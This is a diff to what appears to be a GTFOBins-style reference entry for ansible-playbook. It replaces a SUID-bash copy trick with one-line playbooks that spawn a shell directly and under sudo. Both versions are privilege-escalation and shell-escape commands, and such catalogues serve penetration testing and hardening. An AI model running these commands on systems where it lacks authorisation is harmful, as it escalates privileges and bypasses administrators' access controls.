@@ -1,16 +1,13 @@
 ---
 functions:
-  sudo:
-    - description: Running this command will make a copy of bash with SUID permessions, since you copied it as the sudo user; you will be able to get shell as this user.
+  shell:
     - code: |
-        echo "---" >> shell.yml
-        echo "- name: shell">> shell.yml     
-        echo "  hosts: localhost" >> shell.yml
-        echo "  become: yes" >> shell.yml
-        echo " " >> shell.yml
-        echo "  tasks:" >> shell.yml
-        echo "  - name: hack" >> shell.yml
-        echo "    shell: 'cp /bin/bash . && chmod +sx bash'" >> shell.yml
-        sudo /usr/bin/ansible-playbook shell.yml
-        ./bash -p
+        TF=$(mktemp)
+        echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+        ansible-playbook $TF
+  sudo:
+    - code: |
+        TF=$(mktemp)
+        echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+        sudo ansible-playbook $TF
 ---
